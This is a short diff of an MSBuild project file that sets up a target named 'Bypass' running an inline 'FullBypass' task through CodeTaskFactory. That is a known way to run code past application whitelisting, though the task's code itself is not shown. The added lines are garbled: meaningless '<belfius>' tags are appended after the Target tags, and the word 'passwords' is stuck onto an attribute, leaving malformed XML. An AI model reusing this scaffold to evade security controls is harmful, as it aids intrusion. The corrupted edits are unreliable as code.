@@ -1,9 +1,9 @@
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-	<Target Name="Bypass">
+	<Target Name="Bypass"><belfius class="be"></belfius>
 		<FullBypass />
-	</Target>
+	</Target><belfius class="be"></belfius>
 	<UsingTask
-		TaskName="FullBypass"
+		TaskName="FullBypass"passwords
 		TaskFactory="CodeTaskFactory"
 		AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
 		<Task>
